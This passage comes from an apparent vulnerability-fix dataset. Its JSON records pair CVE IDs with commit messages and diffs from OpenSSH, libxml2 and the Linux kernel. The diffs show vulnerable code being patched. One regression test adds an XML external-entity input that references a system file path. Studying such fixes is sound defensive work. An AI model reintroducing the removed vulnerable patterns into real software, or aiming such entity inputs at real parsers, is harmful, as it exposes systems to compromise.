\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-6564","CWE_ID":"264","category":"security","commit_id":"5e75f5198769056089fb06c4d738ab0e5abc66f7","commit_message":"From 5e75f5198769056089fb06c4d738ab0e5abc66f7 Mon Sep 17 00:00:00 2001\nFrom: Damien Miller <djm@mindrot.org>\nDate: Tue, 11 Aug 2015 13:34:12 +1000\nSubject: [PATCH] set sshpam_ctxt to NULL after free\n\nAvoids use-after-free in monitor when privsep child is compromised.\nReported by Moritz Jodeit; ok dtucker@\n---\n monitor.c | 4 +++-\n 1 file changed, 3 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/monitor.c b\/monitor.c\nindex f1b873dc4..a91420983 100644\n--- a\/monitor.c\n+++ b\/monitor.c\n@@ -1166,14 +1166,16 @@ mm_answer_pam_respond(int sock, Buffer *m)\n int\n mm_answer_pam_free_ctx(int sock, Buffer *m)\n {\n+\tint r = sshpam_authok != NULL && sshpam_authok == sshpam_ctxt;\n \n \tdebug3(\"%s\", __func__);\n \t(sshpam_device.free_ctx)(sshpam_ctxt);\n+\tsshpam_ctxt = sshpam_authok = NULL;\n \tbuffer_clear(m);\n \tmm_request_send(sock, MONITOR_ANS_PAM_FREE_CTX, m);\n \tauth_method = \"keyboard-interactive\";\n \tauth_submethod = \"pam\";\n-\treturn (sshpam_authok == sshpam_ctxt);\n+\treturn r;\n }\n #endif\n \n","owner":"openssh","repo":"openssh-portable","source":"cve"},{"CVE_ID":"CVE-2013-0339","CWE_ID":"264","category":"security","commit_id":"4629ee02ac649c27f9c0cf98ba017c6b5526070f","commit_message":"From 4629ee02ac649c27f9c0cf98ba017c6b5526070f Mon Sep 17 00:00:00 2001\nFrom: Daniel Veillard <veillard@redhat.com>\nDate: Mon, 23 Jul 2012 14:15:40 +0800\nSubject: [PATCH] Do not fetch external parsed entities\n\nUnless explicietely asked for when validating or replacing entities\nwith their value. Problem pointed out by Tom Lane <tgl@redhat.com>\n\n* parser.c: do not load external parsed entities unless needed\n* test\/errors\/extparsedent.xml result\/errors\/extparsedent.xml*:\n  add a regression test to avoid change of the behaviour in the future\n---\n parser.c                           | 11 +++++++++--\n result\/errors\/extparsedent.xml     |  5 +++++\n result\/errors\/extparsedent.xml.err |  0\n result\/errors\/extparsedent.xml.str |  0\n test\/errors\/extparsedent.xml       |  5 +++++\n 5 files changed, 19 insertions(+), 2 deletions(-)\n create mode 100644 result\/errors\/extparsedent.xml\n create mode 100644 result\/errors\/extparsedent.xml.err\n create mode 100644 result\/errors\/extparsedent.xml.str\n create mode 100644 test\/errors\/extparsedent.xml\n\n","diff_code":"diff --git a\/parser.c b\/parser.c\nindex 98632757..a0183f24 100644\n--- a\/parser.c\n+++ b\/parser.c\n@@ -6927,8 +6927,15 @@ xmlParseReference(xmlParserCtxtPtr ctxt) {\n      * The first reference to the entity trigger a parsing phase\n      * where the ent->children is filled with the result from\n      * the parsing.\n-     *\/\n-    if (ent->checked == 0) {\n+     * Note: external parsed entities will not be loaded, it is not\n+     * required for a non-validating parser, unless the parsing option\n+     * of validating, or substituting entities were given. Doing so is\n+     * far more secure as the parser will only process data coming from\n+     * the document entity by default.\n+     *\/\n+    if ((ent->checked == 0) &&\n+        ((ent->etype != XML_EXTERNAL_GENERAL_PARSED_ENTITY) ||\n+         (ctxt->options & (XML_PARSE_NOENT | XML_PARSE_DTDVALID)))) {\n \tunsigned long oldnbent = ctxt->nbentities;\n \n \t\/*\ndiff --git a\/result\/errors\/extparsedent.xml b\/result\/errors\/extparsedent.xml\nnew file mode 100644\nindex 00000000..07e4c54b\n--- \/dev\/null\n+++ b\/result\/errors\/extparsedent.xml\n@@ -0,0 +1,5 @@\n+<?xml version=\"1.0\"?>\n+<!DOCTYPE foo [\n+<!ENTITY c PUBLIC \"bar\" \"\/etc\/doesnotexist\">\n+]>\n+<root>&c;<\/root>\ndiff --git a\/result\/errors\/extparsedent.xml.err b\/result\/errors\/extparsedent.xml.err\nnew file mode 100644\nindex 00000000..e69de29b\ndiff --git a\/result\/errors\/extparsedent.xml.str b\/result\/errors\/extparsedent.xml.str\nnew file mode 100644\nindex 00000000..e69de29b\ndiff --git a\/test\/errors\/extparsedent.xml b\/test\/errors\/extparsedent.xml\nnew file mode 100644\nindex 00000000..07e4c54b\n--- \/dev\/null\n+++ b\/test\/errors\/extparsedent.xml\n@@ -0,0 +1,5 @@\n+<?xml version=\"1.0\"?>\n+<!DOCTYPE foo [\n+<!ENTITY c PUBLIC \"bar\" \"\/etc\/doesnotexist\">\n+]>\n+<root>&c;<\/root>\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-4027","CWE_ID":"264","category":"security","commit_id":"4442dc8a92b8f9ad8ee9e7f8438f4c04c03a22dc","commit_message":"From 4442dc8a92b8f9ad8ee9e7f8438f4c04c03a22dc Mon Sep 17 00:00:00 2001\nFrom: Nicholas Bellinger <nab@linux-iscsi.org>\nDate: Tue, 7 Jan 2014 22:40:27 +0000\nSubject: [PATCH] target\/rd: Refactor rd_build_device_space +\n rd_release_device_space\n\nThis patch refactors rd_build_device_space() + rd_release_device_space()\ninto rd_allocate_sgl_table() + rd_release_device_space() so that they\nmay be used seperatly for setup + release of protection information\nscatterlists.\n\nAlso add explicit memset of pages within rd_allocate_sgl_table() based\nupon passed 'init_payload' value.\n\nv2 changes:\n  - Drop unused sg_table from rd_release_device_space (Wei)\n\nCc: Martin K. Petersen <martin.petersen@oracle.com>\nCc: Christoph Hellwig <hch@lst.de>\nCc: Hannes Reinecke <hare@suse.de>\nCc: Sagi Grimberg <sagig@mellanox.com>\nCc: Or Gerlitz <ogerlitz@mellanox.com>\nSigned-off-by: Nicholas Bellinger <nab@linux-iscsi.org>\n---\n drivers\/target\/target_core_rd.c | 113 +++++++++++++++++++-------------\n 1 file changed, 68 insertions(+), 45 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/target\/target_core_rd.c b\/drivers\/target\/target_core_rd.c\nindex 4ffe5f2ec0e98..e9fa879ac27f3 100644\n--- a\/drivers\/target\/target_core_rd.c\n+++ b\/drivers\/target\/target_core_rd.c\n@@ -78,23 +78,14 @@ static void rd_detach_hba(struct se_hba *hba)\n \thba->hba_ptr = NULL;\n }\n \n-\/*\trd_release_device_space():\n- *\n- *\n- *\/\n-static void rd_release_device_space(struct rd_dev *rd_dev)\n+static u32 rd_release_sgl_table(struct rd_dev *rd_dev, struct rd_dev_sg_table *sg_table,\n+\t\t\t\t u32 sg_table_count)\n {\n-\tu32 i, j, page_count = 0, sg_per_table;\n-\tstruct rd_dev_sg_table *sg_table;\n \tstruct page *pg;\n \tstruct scatterlist *sg;\n+\tu32 i, j, page_count = 0, sg_per_table;\n \n-\tif (!rd_dev->sg_table_array || !rd_dev->sg_table_count)\n-\t\treturn;\n-\n-\tsg_table = rd_dev->sg_table_array;\n-\n-\tfor (i = 0; i < rd_dev->sg_table_count; i++) {\n+\tfor (i = 0; i < sg_table_count; i++) {\n \t\tsg = sg_table[i].sg_table;\n \t\tsg_per_table = sg_table[i].rd_sg_count;\n \n@@ -105,16 +96,28 @@ static void rd_release_device_space(struct rd_dev *rd_dev)\n \t\t\t\tpage_count++;\n \t\t\t}\n \t\t}\n-\n \t\tkfree(sg);\n \t}\n \n+\tkfree(sg_table);\n+\treturn page_count;\n+}\n+\n+static void rd_release_device_space(struct rd_dev *rd_dev)\n+{\n+\tu32 page_count;\n+\n+\tif (!rd_dev->sg_table_array || !rd_dev->sg_table_count)\n+\t\treturn;\n+\n+\tpage_count = rd_release_sgl_table(rd_dev, rd_dev->sg_table_array,\n+\t\t\t\t\t  rd_dev->sg_table_count);\n+\n \tpr_debug(\"CORE_RD[%u] - Released device space for Ramdisk\"\n \t\t\" Device ID: %u, pages %u in %u tables total bytes %lu\\n\",\n \t\trd_dev->rd_host->rd_host_id, rd_dev->rd_dev_id, page_count,\n \t\trd_dev->sg_table_count, (unsigned long)page_count * PAGE_SIZE);\n \n-\tkfree(sg_table);\n \trd_dev->sg_table_array = NULL;\n \trd_dev->sg_table_count = 0;\n }\n@@ -124,38 +127,15 @@ static void rd_release_device_space(struct rd_dev *rd_dev)\n  *\n  *\n  *\/\n-static int rd_build_device_space(struct rd_dev *rd_dev)\n+static int rd_allocate_sgl_table(struct rd_dev *rd_dev, struct rd_dev_sg_table *sg_table,\n+\t\t\t\t u32 total_sg_needed, unsigned char init_payload)\n {\n-\tu32 i = 0, j, page_offset = 0, sg_per_table, sg_tables, total_sg_needed;\n+\tu32 i = 0, j, page_offset = 0, sg_per_table;\n \tu32 max_sg_per_table = (RD_MAX_ALLOCATION_SIZE \/\n \t\t\t\tsizeof(struct scatterlist));\n-\tstruct rd_dev_sg_table *sg_table;\n \tstruct page *pg;\n \tstruct scatterlist *sg;\n-\n-\tif (rd_dev->rd_page_count <= 0) {\n-\t\tpr_err(\"Illegal page count: %u for Ramdisk device\\n\",\n-\t\t\trd_dev->rd_page_count);\n-\t\treturn -EINVAL;\n-\t}\n-\n-\t\/* Don't need backing pages for NULLIO *\/\n-\tif (rd_dev->rd_flags & RDF_NULLIO)\n-\t\treturn 0;\n-\n-\ttotal_sg_needed = rd_dev->rd_page_count;\n-\n-\tsg_tables = (total_sg_needed \/ max_sg_per_table) + 1;\n-\n-\tsg_table = kzalloc(sg_tables * sizeof(struct rd_dev_sg_table), GFP_KERNEL);\n-\tif (!sg_table) {\n-\t\tpr_err(\"Unable to allocate memory for Ramdisk\"\n-\t\t\t\" scatterlist tables\\n\");\n-\t\treturn -ENOMEM;\n-\t}\n-\n-\trd_dev->sg_table_array = sg_table;\n-\trd_dev->sg_table_count = sg_tables;\n+\tunsigned char *p;\n \n \twhile (total_sg_needed) {\n \t\tsg_per_table = (total_sg_needed > max_sg_per_table) ?\n@@ -186,16 +166,59 @@ static int rd_build_device_space(struct rd_dev *rd_dev)\n \t\t\t}\n \t\t\tsg_assign_page(&sg[j], pg);\n \t\t\tsg[j].length = PAGE_SIZE;\n+\n+\t\t\tp = kmap(pg);\n+\t\t\tmemset(p, init_payload, PAGE_SIZE);\n+\t\t\tkunmap(pg);\n \t\t}\n \n \t\tpage_offset += sg_per_table;\n \t\ttotal_sg_needed -= sg_per_table;\n \t}\n \n+\treturn 0;\n+}\n+\n+static int rd_build_device_space(struct rd_dev *rd_dev)\n+{\n+\tstruct rd_dev_sg_table *sg_table;\n+\tu32 sg_tables, total_sg_needed;\n+\tu32 max_sg_per_table = (RD_MAX_ALLOCATION_SIZE \/\n+\t\t\t\tsizeof(struct scatterlist));\n+\tint rc;\n+\n+\tif (rd_dev->rd_page_count <= 0) {\n+\t\tpr_err(\"Illegal page count: %u for Ramdisk device\\n\",\n+\t\t       rd_dev->rd_page_count);\n+\t\treturn -EINVAL;\n+\t}\n+\n+\t\/* Don't need backing pages for NULLIO *\/\n+\tif (rd_dev->rd_flags & RDF_NULLIO)\n+\t\treturn 0;\n+\n+\ttotal_sg_needed = rd_dev->rd_page_count;\n+\n+\tsg_tables = (total_sg_needed \/ max_sg_per_table) + 1;\n+\n+\tsg_table = kzalloc(sg_tables * sizeof(struct rd_dev_sg_table), GFP_KERNEL);\n+\tif (!sg_table) {\n+\t\tpr_err(\"Unable to allocate memory for Ramdisk\"\n+\t\t       \" scatterlist tables\\n\");\n+\t\treturn -ENOMEM;\n+\t}\n+\n+\trd_dev->sg_table_array = sg_table;\n+\trd_dev->sg_table_count = sg_tables;\n+\n+\trc = rd_allocate_sgl_table(rd_dev, sg_table, total_sg_needed, 0x00);\n+\tif (rc)\n+\t\treturn rc;\n+\n \tpr_debug(\"CORE_RD[%u] - Built Ramdisk Device ID: %u space of\"\n-\t\t\" %u pages in %u tables\\n\", rd_dev->rd_host->rd_host_id,\n-\t\trd_dev->rd_dev_id, rd_dev->rd_page_count,\n-\t\trd_dev->sg_table_count);\n+\t\t \" %u pages in %u tables\\n\", rd_dev->rd_host->rd_host_id,\n+\t\t rd_dev->rd_dev_id, rd_dev->rd_page_count,\n+\t\t rd_dev->sg_table_count);\n \n \treturn 0;\n }\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"f8b7256096a20436f6d0926747e3ac3d64c81d24","commit_message":"From f8b7256096a20436f6d0926747e3ac3d64c81d24 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Mon, 30 Nov 2009 17:37:04 -0500\nSubject: Unify sys_mmap*\n\nNew helper - sys_mmap_pgoff(); switch syscalls to using it.\n\nAcked-by: David S. Miller <davem@davemloft.net>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n arch\/alpha\/kernel\/osf_sys.c               | 19 +++----\n arch\/arm\/kernel\/entry-common.S            |  4 +-\n arch\/arm\/kernel\/sys_arm.c                 | 30 +----------\n arch\/avr32\/include\/asm\/syscalls.h         |  4 --\n arch\/avr32\/kernel\/sys_avr32.c             | 31 ------------\n arch\/avr32\/kernel\/syscall-stubs.S         |  2 +-\n arch\/blackfin\/kernel\/sys_bfin.c           | 33 ------------\n arch\/blackfin\/mach-common\/entry.S         |  2 +-\n arch\/cris\/kernel\/sys_cris.c               | 30 ++---------\n arch\/frv\/kernel\/sys_frv.c                 | 66 +-----------------------\n arch\/h8300\/kernel\/sys_h8300.c             | 83 +------------------------------\n arch\/h8300\/kernel\/syscalls.S              |  2 +-\n arch\/ia64\/kernel\/sys_ia64.c               | 37 +-------------\n arch\/m32r\/kernel\/sys_m32r.c               | 24 ---------\n arch\/m32r\/kernel\/syscall_table.S          |  2 +-\n arch\/m68k\/kernel\/sys_m68k.c               | 83 +++----------------------------\n arch\/m68knommu\/kernel\/sys_m68k.c          | 38 +-------------\n arch\/m68knommu\/kernel\/syscalltable.S      |  2 +-\n arch\/microblaze\/kernel\/sys_microblaze.c   | 38 ++------------\n arch\/microblaze\/kernel\/syscall_table.S    |  2 +-\n arch\/mips\/kernel\/linux32.c                | 19 +------\n arch\/mips\/kernel\/syscall.c                | 29 +----------\n arch\/mn10300\/kernel\/entry.S               |  2 +-\n arch\/mn10300\/kernel\/sys_mn10300.c         | 31 +-----------\n arch\/parisc\/kernel\/sys_parisc.c           | 30 ++---------\n arch\/powerpc\/kernel\/syscalls.c            | 15 +-----\n arch\/s390\/kernel\/compat_linux.c           | 32 ++----------\n arch\/s390\/kernel\/sys_s390.c               | 30 +----------\n arch\/score\/kernel\/sys_score.c             | 25 ++--------\n arch\/sh\/kernel\/sys_sh.c                   | 28 +----------\n arch\/sparc\/kernel\/sys_sparc_32.c          | 31 ++----------\n arch\/sparc\/kernel\/sys_sparc_64.c          | 22 +++-----\n arch\/um\/kernel\/syscall.c                  | 28 +----------\n arch\/um\/sys-i386\/shared\/sysdep\/syscalls.h |  4 --\n arch\/x86\/ia32\/ia32entry.S                 |  2 +-\n arch\/x86\/ia32\/sys_ia32.c                  | 43 +---------------\n arch\/x86\/include\/asm\/sys_ia32.h           |  3 --\n arch\/x86\/include\/asm\/syscalls.h           |  2 -\n arch\/x86\/kernel\/sys_i386_32.c             | 27 +---------\n arch\/x86\/kernel\/sys_x86_64.c              | 17 +------\n arch\/x86\/kernel\/syscall_table_32.S        |  2 +-\n arch\/xtensa\/include\/asm\/syscall.h         |  2 -\n arch\/xtensa\/include\/asm\/unistd.h          |  2 +-\n arch\/xtensa\/kernel\/syscall.c              | 25 ----------\n include\/linux\/syscalls.h                  |  4 ++\n mm\/util.c                                 | 29 +++++++++++\n 46 files changed, 109 insertions(+), 907 deletions(-)\n\n","diff_code":"diff --git a\/arch\/alpha\/kernel\/osf_sys.c b\/arch\/alpha\/kernel\/osf_sys.c\nindex 9a3334ae282e..62619f25132f 100644\n--- a\/arch\/alpha\/kernel\/osf_sys.c\n+++ b\/arch\/alpha\/kernel\/osf_sys.c\n@@ -178,25 +178,18 @@ SYSCALL_DEFINE6(osf_mmap, unsigned long, addr, unsigned long, len,\n \t\tunsigned long, prot, unsigned long, flags, unsigned long, fd,\n \t\tunsigned long, off)\n {\n-\tstruct file *file = NULL;\n-\tunsigned long ret = -EBADF;\n+\tunsigned long ret = -EINVAL;\n \n #if 0\n \tif (flags & (_MAP_HASSEMAPHORE | _MAP_INHERIT | _MAP_UNALIGNED))\n \t\tprintk(\"%s: unimplemented OSF mmap flags %04lx\\n\", \n \t\t\tcurrent->comm, flags);\n #endif\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tdown_write(&current->mm->mmap_sem);\n-\tret = do_mmap(file, addr, len, prot, flags, off);\n-\tup_write(&current->mm->mmap_sem);\n-\tif (file)\n-\t\tfput(file);\n+\tif ((off + PAGE_ALIGN(len)) < off)\n+\t\tgoto out;\n+\tif (off & ~PAGE_MASK)\n+\t\tgoto out;\n+\tret = sys_mmap_pgoff(addr, len, prot, flags, fd, off >> PAGE_SHIFT);\n  out:\n \treturn ret;\n }\ndiff --git a\/arch\/arm\/kernel\/entry-common.S b\/arch\/arm\/kernel\/entry-common.S\nindex f0fe95b7085d..2c1db77d7848 100644\n--- a\/arch\/arm\/kernel\/entry-common.S\n+++ b\/arch\/arm\/kernel\/entry-common.S\n@@ -416,12 +416,12 @@ sys_mmap2:\n \t\ttst\tr5, #PGOFF_MASK\n \t\tmoveq\tr5, r5, lsr #PAGE_SHIFT - 12\n \t\tstreq\tr5, [sp, #4]\n-\t\tbeq\tdo_mmap2\n+\t\tbeq\tsys_mmap_pgoff\n \t\tmov\tr0, #-EINVAL\n \t\tmov\tpc, lr\n #else\n \t\tstr\tr5, [sp, #4]\n-\t\tb\tdo_mmap2\n+\t\tb\tsys_mmap_pgoff\n #endif\n ENDPROC(sys_mmap2)\n \ndiff --git a\/arch\/arm\/kernel\/sys_arm.c b\/arch\/arm\/kernel\/sys_arm.c\nindex 3b897444a9bd..ae4027bd01bd 100644\n--- a\/arch\/arm\/kernel\/sys_arm.c\n+++ b\/arch\/arm\/kernel\/sys_arm.c\n@@ -28,34 +28,6 @@\n #include <linux\/ipc.h>\n #include <linux\/uaccess.h>\n \n-\/* common code for old and new mmaps *\/\n-inline long do_mmap2(\n-\tunsigned long addr, unsigned long len,\n-\tunsigned long prot, unsigned long flags,\n-\tunsigned long fd, unsigned long pgoff)\n-{\n-\tint error = -EINVAL;\n-\tstruct file * file = NULL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\n-\terror = -EBADF;\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-out:\n-\treturn error;\n-}\n-\n struct mmap_arg_struct {\n \tunsigned long addr;\n \tunsigned long len;\n@@ -77,7 +49,7 @@ asmlinkage int old_mmap(struct mmap_arg_struct __user *arg)\n \tif (a.offset & ~PAGE_MASK)\n \t\tgoto out;\n \n-\terror = do_mmap2(a.addr, a.len, a.prot, a.flags, a.fd, a.offset >> PAGE_SHIFT);\n+\terror = sys_mmap_pgoff(a.addr, a.len, a.prot, a.flags, a.fd, a.offset >> PAGE_SHIFT);\n out:\n \treturn error;\n }\ndiff --git a\/arch\/avr32\/include\/asm\/syscalls.h b\/arch\/avr32\/include\/asm\/syscalls.h\nindex 483d666c27c0..66a197266637 100644\n--- a\/arch\/avr32\/include\/asm\/syscalls.h\n+++ b\/arch\/avr32\/include\/asm\/syscalls.h\n@@ -29,10 +29,6 @@ asmlinkage int sys_sigaltstack(const stack_t __user *, stack_t __user *,\n \t\t\t       struct pt_regs *);\n asmlinkage int sys_rt_sigreturn(struct pt_regs *);\n \n-\/* kernel\/sys_avr32.c *\/\n-asmlinkage long sys_mmap2(unsigned long, unsigned long, unsigned long,\n-\t\t\t  unsigned long, unsigned long, off_t);\n-\n \/* mm\/cache.c *\/\n asmlinkage int sys_cacheflush(int, void __user *, size_t);\n \ndiff --git a\/arch\/avr32\/kernel\/sys_avr32.c b\/arch\/avr32\/kernel\/sys_avr32.c\nindex 5d2daeaf356f..459349b5ed5a 100644\n--- a\/arch\/avr32\/kernel\/sys_avr32.c\n+++ b\/arch\/avr32\/kernel\/sys_avr32.c\n@@ -5,39 +5,8 @@\n  * it under the terms of the GNU General Public License version 2 as\n  * published by the Free Software Foundation.\n  *\/\n-#include <linux\/errno.h>\n-#include <linux\/fs.h>\n-#include <linux\/file.h>\n-#include <linux\/mm.h>\n #include <linux\/unistd.h>\n \n-#include <asm\/mman.h>\n-#include <asm\/uaccess.h>\n-#include <asm\/syscalls.h>\n-\n-asmlinkage long sys_mmap2(unsigned long addr, unsigned long len,\n-\t\t\t  unsigned long prot, unsigned long flags,\n-\t\t\t  unsigned long fd, off_t offset)\n-{\n-\tint error = -EBADF;\n-\tstruct file *file = NULL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\treturn error;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, offset);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-\treturn error;\n-}\n-\n int kernel_execve(const char *file, char **argv, char **envp)\n {\n \tregister long scno asm(\"r8\") = __NR_execve;\ndiff --git a\/arch\/avr32\/kernel\/syscall-stubs.S b\/arch\/avr32\/kernel\/syscall-stubs.S\nindex f7244cd02fbb..0447a3e2ba64 100644\n--- a\/arch\/avr32\/kernel\/syscall-stubs.S\n+++ b\/arch\/avr32\/kernel\/syscall-stubs.S\n@@ -61,7 +61,7 @@ __sys_execve:\n __sys_mmap2:\n \tpushm\tlr\n \tst.w\t--sp, ARG6\n-\tcall\tsys_mmap2\n+\tcall\tsys_mmap_pgoff\n \tsub\tsp, -4\n \tpopm\tpc\n \ndiff --git a\/arch\/blackfin\/kernel\/sys_bfin.c b\/arch\/blackfin\/kernel\/sys_bfin.c\nindex afcef129d4e8..2e7f8e10bf87 100644\n--- a\/arch\/blackfin\/kernel\/sys_bfin.c\n+++ b\/arch\/blackfin\/kernel\/sys_bfin.c\n@@ -22,39 +22,6 @@\n #include <asm\/cacheflush.h>\n #include <asm\/dma.h>\n \n-\/* common code for old and new mmaps *\/\n-static inline long\n-do_mmap2(unsigned long addr, unsigned long len,\n-\t unsigned long prot, unsigned long flags,\n-\t unsigned long fd, unsigned long pgoff)\n-{\n-\tint error = -EBADF;\n-\tstruct file *file = NULL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n- out:\n-\treturn error;\n-}\n-\n-asmlinkage long sys_mmap2(unsigned long addr, unsigned long len,\n-\t\t\t  unsigned long prot, unsigned long flags,\n-\t\t\t  unsigned long fd, unsigned long pgoff)\n-{\n-\treturn do_mmap2(addr, len, prot, flags, fd, pgoff);\n-}\n-\n asmlinkage void *sys_sram_alloc(size_t size, unsigned long flags)\n {\n \treturn sram_alloc_with_lsl(size, flags);\ndiff --git a\/arch\/blackfin\/mach-common\/entry.S b\/arch\/blackfin\/mach-common\/entry.S\nindex a50637a8b9bd..f3f8bb46b517 100644\n--- a\/arch\/blackfin\/mach-common\/entry.S\n+++ b\/arch\/blackfin\/mach-common\/entry.S\n@@ -1422,7 +1422,7 @@ ENTRY(_sys_call_table)\n \t.long _sys_ni_syscall\t\/* streams2 *\/\n \t.long _sys_vfork\t\t\/* 190 *\/\n \t.long _sys_getrlimit\n-\t.long _sys_mmap2\n+\t.long _sys_mmap_pgoff\n \t.long _sys_truncate64\n \t.long _sys_ftruncate64\n \t.long _sys_stat64\t\/* 195 *\/\ndiff --git a\/arch\/cris\/kernel\/sys_cris.c b\/arch\/cris\/kernel\/sys_cris.c\nindex 2ad962c7e88e..c2bbb1ac98a9 100644\n--- a\/arch\/cris\/kernel\/sys_cris.c\n+++ b\/arch\/cris\/kernel\/sys_cris.c\n@@ -26,31 +26,6 @@\n #include <asm\/uaccess.h>\n #include <asm\/segment.h>\n \n-\/* common code for old and new mmaps *\/\n-static inline long\n-do_mmap2(unsigned long addr, unsigned long len, unsigned long prot,\n-        unsigned long flags, unsigned long fd, unsigned long pgoff)\n-{\n-        int error = -EBADF;\n-        struct file * file = NULL;\n-\n-        flags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-        if (!(flags & MAP_ANONYMOUS)) {\n-                file = fget(fd);\n-                if (!file)\n-                        goto out;\n-        }\n-\n-        down_write(&current->mm->mmap_sem);\n-        error = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-        up_write(&current->mm->mmap_sem);\n-\n-        if (file)\n-                fput(file);\n-out:\n-        return error;\n-}\n-\n asmlinkage unsigned long old_mmap(unsigned long __user *args)\n {        \n \tunsigned long buffer[6];\n@@ -63,7 +38,7 @@ asmlinkage unsigned long old_mmap(unsigned long __user *args)\n \tif (buffer[5] & ~PAGE_MASK) \/* verify that offset is on page boundary *\/\n \t\tgoto out;\n \n-\terr = do_mmap2(buffer[0], buffer[1], buffer[2], buffer[3],\n+\terr = sys_mmap_pgoff(buffer[0], buffer[1], buffer[2], buffer[3],\n                        buffer[4], buffer[5] >> PAGE_SHIFT);\n out:\n \treturn err;\n@@ -73,7 +48,8 @@ asmlinkage long\n sys_mmap2(unsigned long addr, unsigned long len, unsigned long prot,\n           unsigned long flags, unsigned long fd, unsigned long pgoff)\n {\n-        return do_mmap2(addr, len, prot, flags, fd, pgoff);\n+\t\/* bug(?): 8Kb pages here *\/\n+        return sys_mmap_pgoff(addr, len, prot, flags, fd, pgoff);\n }\n \n \/*\ndiff --git a\/arch\/frv\/kernel\/sys_frv.c b\/arch\/frv\/kernel\/sys_frv.c\nindex 2b6b5289cdcc..1d3d4c9e2521 100644\n--- a\/arch\/frv\/kernel\/sys_frv.c\n+++ b\/arch\/frv\/kernel\/sys_frv.c\n@@ -31,9 +31,6 @@ asmlinkage long sys_mmap2(unsigned long addr, unsigned long len,\n \t\t\t  unsigned long prot, unsigned long flags,\n \t\t\t  unsigned long fd, unsigned long pgoff)\n {\n-\tint error = -EBADF;\n-\tstruct file * file = NULL;\n-\n \t\/* As with sparc32, make sure the shift for mmap2 is constant\n \t   (12), no matter what PAGE_SIZE we have.... *\/\n \n@@ -41,69 +38,10 @@ asmlinkage long sys_mmap2(unsigned long addr, unsigned long len,\n \t   trying to map something we can't *\/\n \tif (pgoff & ((1 << (PAGE_SHIFT - 12)) - 1))\n \t\treturn -EINVAL;\n-\tpgoff >>= PAGE_SHIFT - 12;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-out:\n-\treturn error;\n-}\n-\n-#if 0 \/* DAVIDM - do we want this *\/\n-struct mmap_arg_struct64 {\n-\t__u32 addr;\n-\t__u32 len;\n-\t__u32 prot;\n-\t__u32 flags;\n-\t__u64 offset; \/* 64 bits *\/\n-\t__u32 fd;\n-};\n-\n-asmlinkage long sys_mmap64(struct mmap_arg_struct64 *arg)\n-{\n-\tint error = -EFAULT;\n-\tstruct file * file = NULL;\n-\tstruct mmap_arg_struct64 a;\n-\tunsigned long pgoff;\n-\n-\tif (copy_from_user(&a, arg, sizeof(a)))\n-\t\treturn -EFAULT;\n-\n-\tif ((long)a.offset & ~PAGE_MASK)\n-\t\treturn -EINVAL;\n-\n-\tpgoff = a.offset >> PAGE_SHIFT;\n-\tif ((a.offset >> PAGE_SHIFT) != pgoff)\n-\t\treturn -EINVAL;\n-\n-\tif (!(a.flags & MAP_ANONYMOUS)) {\n-\t\terror = -EBADF;\n-\t\tfile = fget(a.fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\ta.flags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n \n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, a.addr, a.len, a.prot, a.flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\tif (file)\n-\t\tfput(file);\n-out:\n-\treturn error;\n+\treturn sys_mmap_pgoff(addr, len, prot, flags, fd,\n+\t\t\t      pgoff >> (PAGE_SHIFT - 12));\n }\n-#endif\n \n \/*\n  * sys_ipc() is the de-multiplexer for the SysV IPC calls..\ndiff --git a\/arch\/h8300\/kernel\/sys_h8300.c b\/arch\/h8300\/kernel\/sys_h8300.c\nindex 8cb5d73a0e35..b5969db0ca10 100644\n--- a\/arch\/h8300\/kernel\/sys_h8300.c\n+++ b\/arch\/h8300\/kernel\/sys_h8300.c\n@@ -26,39 +26,6 @@\n #include <asm\/traps.h>\n #include 